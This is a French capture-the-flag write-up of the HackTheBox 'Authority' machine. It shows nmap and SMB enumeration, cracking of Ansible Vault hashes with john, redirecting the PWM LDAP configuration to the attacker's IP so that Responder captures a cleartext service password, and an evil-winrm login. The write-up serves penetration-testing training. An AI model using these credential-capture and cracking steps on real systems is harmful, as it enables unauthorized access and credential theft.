---
title:  "HacktheBox WriteUp : Authority"
category: HackTheBox
tag: writeups
---
### Skills
- Nmap
- gobuster
-

### Scanner le réseau

On scan le réseau et on voit de nombreux ports ouvert, dont certains services nous indique qu'il s'agit d'une machine windows.
```console
└─$ nmap 10.10.11.222        
Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-08 14:21 CET
Nmap scan report for 10.10.11.222
Host is up (0.12s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
8443/tcp open  https-alt
```

```console
$  nmap -sCV 10.10.11.222 -p 53,80,88,135,139,389,445,464,593,636,3268,3269,8443
Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-08 14:34 CET
Nmap scan report for 10.10.11.222
Host is up (0.18s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-08 17:34:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-11-08T17:35:16+00:00; +4h00m02s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-11-08T17:35:17+00:00; +4h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-11-08T17:35:16+00:00; +4h00m02s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-11-08T17:35:17+00:00; +4h00m02s from scanner time.
8443/tcp open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Wed, 08 Nov 2023 17:34:32 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Wed, 08 Nov 2023 17:34:30 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Wed, 08 Nov 2023 17:34:30 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Wed, 08 Nov 2023 17:34:38 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2023-11-06T10:27:55
|_Not valid after:  2025-11-07T22:06:19
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.92%T=SSL%I=7%D=11/8%Time=654B8E64%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;c
SF:harset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Wed,\x2008\x20No
SF:v\x202023\x2017:34:30\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\n<
SF:html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'\"/
SF:></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20G
SF:ET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20We
SF:d,\x2008\x20Nov\x202023\x2017:34:30\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20
SF:text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Wed,\
SF:x2008\x20Nov\x202023\x2017:34:32\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;UR
SF:L='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20\r\
SF:nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r\
SF:nContent-Length:\x201936\r\nDate:\x20Wed,\x2008\x20Nov\x202023\x2017:34
SF::38\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20la
SF:ng=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,
SF:Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background
SF:-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\
SF:x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bla
SF:ck;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</s
SF:tyle></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R
SF:equest</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x20Re
SF:port</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x20the
SF:\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><p><
SF:b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20pr
SF:ocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20perc
SF:eived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x20
SF:request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Enumeration SMB
On liste les ressources du serveur.
```console
$ smbmap -H 10.10.11.222 -u " "
[+] Guest session       IP: 10.10.11.222:445    Name: 10.10.11.222                                      
Disk                                                    Permissions     Comment
----                                                    -----------     -------
ADMIN$                                                  NO ACCESS       Remote Admin
C$                                                      NO ACCESS       Default share
Department Shares                                       NO ACCESS
Development                                             READ ONLY
IPC$                                                    READ ONLY       Remote IPC
NETLOGON                                                NO ACCESS       Logon server share 
SYSVOL                                                  NO ACCESS       Logon server share
```

On se connecte sur la ressource "Development" :
```console
$ smbclient -N -L //10.10.11.222/Development 
```

En explorant le dossier `PWM`, du share `Development`, on trouve un fichier `main.yml` contenant des credentials sous le format **Ansible**.

```console
\\10.10.11.222\Development\Automation\Ansible\PWM\defaults\main.yml
```

<img src="/assets/images/WriteUps/HackTheBox/Autority/smbCredentialsHash.png" width="600px" height="400px" style="display: block; margin: 0 auto"/>

En faisant quelques recherches, on trouve que [PWM](https://github.com/pwm-project/pwm/) est une application libre-service de mot de passe open source pour les annuaires LDAP.
On met ça de côté et on essaye de continuer notre énumération.

On découvre aussi que [Ansible](https://fr.wikipedia.org/wiki/Ansible_(logiciel)) est une plateforme qui permet le déploiement de logiciels multinoeuds et la gestion de configuration (entre autres).

### Crackage de credentials

On récupère les trois hash montrés précédemment dans des fichiers séparés qui sont chiffrés selon l'algorithme de type`Ansible Vault Secret`.

On trouve la méthodologie dans cet [article](https://exploit-notes.hdks.org/exploit/cryptography/algorithm/ansible-vault-secret/) pour les déchiffrer et on l'applique.
```console
$ ansible2john ansible_pwm_admin_login.yml > pwmLoginHash.txt
$ ansible2john ansible_pwm_admin_password.yml > pwmPasswordHash.txt
$ ansible2john ansible_ldap_admin_password.yml  > ldapAdminPassHash.txt

$ john ldapAdminPassHash.txt       
Proceeding with wordlist:/usr/share/john/password.lst
!@#$%^&*         (ansible_ldap_admin_password.yml)     
Session completed. 
```
On voit que le pass de vault est le même pour les 3 hashes.
On obtient ainsi les credentials que l'on met de côté pour la suite :

`pwmAdminLogin:svc_pwm`
`pwmAdminPass:pWm_@dm!N_!23`
`ldapAdminPass:DevT3st@123`

<img src="/assets/images/WriteUps/HackTheBox/Autority/pwmAdminLogin.png" width="300px" height="50px" style="display: block; margin: 0 auto"/>
<img src="/assets/images/WriteUps/HackTheBox/Autority/pwmAdminPass.png" width="300px" height="50px" style="display: block; margin: 0 auto"/>
<img src="/assets/images/WriteUps/HackTheBox/Autority/ldapAdminPassword.png" width="300px" height="50px" style="display: block; margin: 0 auto"/>

## Enumération web

On explore le site sur le port 80, mais il n'y a qu'une page avec une image qui redirige vers un site microsoft, donc rien de particulier.

On utilise gobuster également mais aucun endpoint n'est trouvé.
```console
$ gobuster dir -u http://10.10.11.222 --wordlist /usr/share/dirb/wordlists/common.txt
```

On se rappelle qu'il y avait un port non conventionnel (8443), on l'énumère avec plus de détails avec nmap :

```console
└─$ nmap -sC -sV 10.10.11.222 -p 8443
Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-08 17:17 CET
Nmap scan report for 10.10.11.222
Host is up (0.094s latency).

PORT     STATE SERVICE       VERSION
8443/tcp open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Wed, 08 Nov 2023 20:17:49 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Wed, 08 Nov 2023 20:17:47 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Wed, 08 Nov 2023 20:17:47 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Wed, 08 Nov 2023 20:17:55 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
 .......
```

On voit qu'il y a du ssl/https, don on essaye de naviguer sur `https:10.10.11.222:8443/`.

On est redirigé vers le lien `https://10.10.11.222:8443/pwm/private/login`, application de mot de passe en libre-service open source spécialement conçue pour l'intégration d'annuaire LDAP.

On est sur une page d'authentification. On essaye les credentials obtenu précédemment et on obtient une erreur lors de la tentative de connection au ldaps serveur :

<img src="/assets/images/WriteUps/HackTheBox/Autority/ldapsErrorConnection.png" width="400px" height="400px" style="display: block; margin: 0 auto"/>

Sans authentification, nous avons un onglet de configuration "Manager" et "Editor".

<img src="/assets/images/WriteUps/HackTheBox/Autority/authenPage.png" width="300px" height="300px" style="display: block; margin: 0 auto"/>


On peut accéder à la configuration Manager à l'aide du mot de passe `pWm_@dm!N_!23` récupérer lors de l'énumération ldap.

<img src="/assets/images/WriteUps/HackTheBox/Autority/ldapDownloadConfiguration.png" width="400px" height="400px" style="display: block; margin: 0 auto"/>

On trouve un fichier de configuration au format xml qui en sensé contenir des données sensibles.

Nous pouvons également importer un fichier de configuration. C'est pourquoi nous avons eu l'idée d'utiliser Responder pour émuler un serveur LDAP et observer les informations qu'il nous envoie.

> Responder est un outil de sniffing, notamment du protocole LDAP pour notre utilisation

### Utilisation de responder sous kali

Etant donné que le `Responder` ne peut émuler un serveur ldaps mais seulement un serveur ldap, nous allons modifier le fichier de configuration pour que cela corresponde.

On change la ligne `<value>ldaps://authority.authority.htb:636</value>` par `<value>ldap://10.10.16.58:389</value>`

<u>Côté attaquant</u>
On met le listener en marche côté kali :
```console
sudo responder -I tun0
```

<u>Côté site web</u>
On importe le fichier de configuration modifié et on attend d'avoir des actions sur le listeners.


On obtient des identifiants en dur :
<img src="/assets/images/WriteUps/HackTheBox/Autority/clearTextLdap.png" width="600px" height="70" style="display: block; margin: 0 auto"/>

`Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb`
`Cleartext Password : lDaP_1n_th3_cle4r!`

### Utilisation de WinRM

On utilise les credentials récupérer précédemment avec evil-rm :
```console
$ evil-winrm -i 10.10.11.222 -u svc_ldap -p lDaP_1n_th3_cle4r!
```

On obtient le flag user dans le bureau.

## Escalade de privilège


## Ref

- [PWM](https://github.com/pwm-project/pwm/)
- [Ansible](https://fr.wikipedia.org/wiki/Ansible_(logiciel))
- [Ansible Vault Secret](https://exploit-notes.hdks.org/exploit/cryptography/algorithm/ansible-vault-secret/)
- [Utilisation de Responder - A voir plus tard](https://systemweakness.com/using-responder-to-capture-the-credentials-a9d5a1013333)